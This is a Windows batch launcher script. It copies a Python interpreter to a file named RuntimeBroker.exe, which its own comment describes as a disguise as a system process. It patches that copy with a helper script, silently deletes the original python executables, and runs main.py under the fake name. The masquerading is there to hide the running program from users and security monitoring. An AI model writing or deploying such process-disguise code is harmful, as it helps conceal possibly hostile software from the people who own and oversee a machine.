@echo off
cd /d "%~dp0"
set "VENV=%~dp0.venv\Scripts"
:: Create RuntimeBroker.exe and disguise as system process
if not exist "%VENV%\RuntimeBroker.exe" (
    copy /Y "%VENV%\python.exe" "%VENV%\RuntimeBroker.exe" >nul 2>&1
    "%VENV%\python.exe" "%~dp0patch_exe.py" "%VENV%\RuntimeBroker.exe" >nul 2>&1
)
:: Remove python executables
if exist "%VENV%\python.exe" del /F /Q "%VENV%\python.exe" >nul 2>&1
if exist "%VENV%\pythonw.exe" del /F /Q "%VENV%\pythonw.exe" >nul 2>&1
"%VENV%\RuntimeBroker.exe" main.py
